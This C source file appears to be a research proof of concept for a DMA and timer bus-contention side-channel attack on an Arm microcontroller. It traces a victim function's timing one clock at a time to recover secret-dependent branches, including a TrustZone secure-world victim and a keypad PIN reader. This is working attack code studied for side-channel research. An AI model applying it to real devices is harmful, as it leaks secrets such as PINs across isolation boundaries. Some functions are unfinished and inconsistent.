#include "toy_busted.h"

// "nop" instruction cannot used, because it is not reliable! Sometimes it
// last 1 clock other times 0 clocks. Even with -o0 and the actual nop being
// present in the asm code. I think the processor sometimes does not execute the
// nop instructions
#define MY_NOP()  __asm volatile("mov r8,r8")

#define TEN_NOPS()do {\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
		MY_NOP();\
	} while(0)

#define HUNDRED_NOPS()do {\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
        TEN_NOPS();\
    } while(0)

// 600 Nops
#define NOPS_TO_AVOID_COLLISIONS() do { \
        HUNDRED_NOPS();\
        HUNDRED_NOPS();\
        HUNDRED_NOPS();\
        HUNDRED_NOPS();\
        HUNDRED_NOPS();\
        HUNDRED_NOPS();\
        } while(0)

#define DELAY_6_CLOCKS() do { \
    MY_NOP(); \
    MY_NOP(); \
    MY_NOP(); \
    MY_NOP(); \
    MY_NOP(); \
    MY_NOP(); \
} while(0)

#define MAX_SECRET 256
#define BUFFER_SIZE 1000
#define N_INSTRUCTIONS 100

static uint32_t dst_mem[BUFFER_SIZE] = {0};
volatile int *ptr_cnt = 0x40001400+0x24;
char dma_lat[N_INSTRUCTIONS] = {0};
//******************************************************************************
// DMA Side-Channel -> Accurate Tracing 
//******************************************************************************
// Note: For back-to-back 1 clock precision tracing (when the trace is taken in
//multiple rounds) ARR can have other values than 1, but in the range of 1 to 9,
//otherwise the next DMA transaction, does not start right after the previous one
#define START_ACCURATE_TRACE() do{\
    int volatile  *tim3_CR1 =   0x40000400, \
                  *tim3_SR =    0x40000410,  \
                  *tim3_DIER =  0x4000040C,  \
                  *tim3_EGR =   0x40000414,  \
                  *tim3_CNT =   0x40000424, \
                  *tim3_ARR =   0x4000042C; \
    *tim3_ARR = auto_reload; \
    *tim3_CNT = (auto_reload-1) - clock_to_collide; \
    *tim3_SR = 0; \
    *tim3_DIER = 0; \
    HAL_TIM_Base_Start(&htim7);                                      \
    HAL_DMA_Start(&hdma_tim3_up, (uint32_t)ptr_cnt, (uint32_t)&dst_mem, n_collisions); \
    __HAL_DMA_ENABLE(&hdma_tim3_up); \
    *tim3_DIER = 1<<8; \         
    __HAL_TIM_ENABLE(&htim3);\    
    MY_NOP(); /* 1 Clock to wait that tim5 start counting*/\    
    MY_NOP(); /* 1 Clock for the counter reach the smallest ARR value = 1*/\    
    MY_NOP(); /* 1 clock for the interrupt (a.k.a, update event) be generated*/\  
    MY_NOP(); /* 1 clock dma setup*/\    
    MY_NOP(); /* 1 clock dma setup*/\   
    DELAY_6_CLOCKS(); /* delay to ensure the 1st collision happens in the victim 1st clock*/\ 
  }while(0)

#define END_ACCURATE_TRACE() do{\
    NOPS_TO_AVOID_COLLISIONS(); \
    __HAL_TIM_DISABLE(&htim3);\
    HAL_DMA_Abort(&hdma_tim3_up);\
    HAL_TIM_Base_Stop(&htim7);\
    *ptr_cnt = 0;\
  }while(0)

void process_accurate_collision(int collision_n){
  dma_lat[collision_n] = (dst_mem[1]-dst_mem[0])&0xFF;
}

void print_accurate_collision(){
//   printf("CLK\t|");
//   for(int clk = 0; clk < 50; clk++){
//      printf(" %3d\t|", clk );
//   }
//   printf("\n");
//   printf("COL\t|");
  for(int clk = 1; clk < N_INSTRUCTIONS; clk++){
     printf(" %3d\t|", dma_lat[clk] );
  }
  printf("\n");
}

// Auto_reload -> number o clocks the timer will count untill interrupt
// clock_to_collide -> the clock where the 1st interrupt will occur
// n_collisions -> number of collisions that we want to provoke, i.e., DMA reads
__attribute__((optimize(0))) void get_accurate_trace( int  auto_reload, 
                                                      int clock_to_collide, 
                                                      int n_collisions,
                                                      void (*victim)()){
  //clock_to_collide is used inside this macro
  START_ACCURATE_TRACE();
  // Victim start --------------------------------------------------------------
  victim();
  // Victim end ----------------------------------------------------------------
  END_ACCURATE_TRACE();
}

void trace_victim(void (*victim)()){
  int instruction = 0;
  int first_clock_collision = 0;

  while(instruction++ < N_INSTRUCTIONS){
    get_accurate_trace(1, first_clock_collision, 2, victim);  
    process_accurate_collision(first_clock_collision++);
  }
  printf("\n");
  print_accurate_collision();
  printf("\n");
}


//------------------------------------------------------------------------------
// Victims - Cacheble 
//------------------------------------------------------------------------------
int secret = 20;
void victim(){
    int i = 0;
	int var = 0;
    if(secret==1)
        var = 1;
    else
        var = 0;
} 

//------------------------------------------------------------------------------
// Trace If-then-Else Paths 
//------------------------------------------------------------------------------
void if_path(){
    secret = 0;
    victim();
}

void else_path(){
    secret = 1;
    victim();
}

//------------------------------------------------------------------------------
// PoC Toy Cache Attack
//------------------------------------------------------------------------------
void wrap_victim_s_world(){
    // Invoke the victim in the S world. We need this wrap because the trace
    // in waiting for a function pointer void (*victim)(void) and the NS entry 
    // point is not.
    victim_s_world();
}

void toy_attack_busted_ns(){
    trace_victim(if_path);
    printf("###################\r\n");
    trace_victim(else_path);
}

void toy_attack_busted_s(){
    trace_victim(wrap_victim_s_world);
    printf("###################\r\n");
    trace_victim(wrap_victim_s_world);
}

#define KYPD_NB_KEYS 16
#define PIN_LEN 4
int init = 0;
int key_state = 0;
int current_key_state = 0;
char pin[PIN_LEN]; 
int pin_idx = 0;
char dummy_pin[PIN_LEN];
int dummy_pin_idx = 0;
// Securely store constant initialized keymap in SM text section
const char keymap[] = {
    '1', '4', '7', '*',
    '2', '5', '8', '0',
    '3', '6', '9', '#',
    'A', 'B', 'C', 'D', 
}; 

int key_press = 0;

int get_keypad_state(){
  return 1<<(key_press++); 
}

int read_keypad_get_trace(void)
{
    int is_pressed, mask = 0x1;
    int new_key_state = get_keypad_state();

    for (int key = 0; key < 4; key++)
    // for (int key = 0; key < KYPD_NB_KEYS; key++)
    { 
        // detect rising edge
        // is_pressed = (new_key_state & mask) & ~(key_state & mask);
        if ((new_key_state & mask))
          pin[pin_idx++] = key;
        else
          dummy_pin[dummy_pin_idx++] = key;
        // pin_idx = 0; 
        // dummy_pin_idx = 0; //avoid buffer overflow
        // mask <<= 1;
    }
    // key_state = new_key_state;
    // return (2*4 - dummy_pin_idx);
    // return (PIN_LEN - key_press);
    // return (PIN_LEN - pin_idx);
}

void read_pin_get_trace(){
  int pin_len = PIN_LEN;
  key_press = 0;
  while(PIN_LEN - key_press){
    read_keypad_get_trace();
  }
  dummy_pin_idx = 0;
  // pin_idx = 0;
}

void read_keypad_test(){
  int is_pressed, mask = 0x1;
  int new_key_state = get_keypad_state();
  int dummy_pin_idx = 0;
  static int pin_idx = 0;

  for (int key = 0; key < 4; key++)
  // for (int key = 0; key < KYPD_NB_KEYS; key++)
  { 
      // detect rising edge
      is_pressed = (new_key_state & mask) & ~(key_state & mask);
      if (is_pressed)
        pin[pin_idx++] = key;
      else
        dummy_pin[dummy_pin_idx++] = key;
      // pin_idx = 0; 
      dummy_pin_idx = 0; //avoid buffer overflow
      mask <<= 1;
  }
  key_state = new_key_state;
  // return (2*4 - dummy_pin_idx);
  return (PIN_LEN - key_press);
  // return (PIN_LEN - pin_idx);
}

void toy_attack_busted(){
  read_pin_get_trace();
  printf("PIN = %d%d%d%d\n", pin[0], pin[1], pin[2], pin[3]);
  read_keypad_test();
}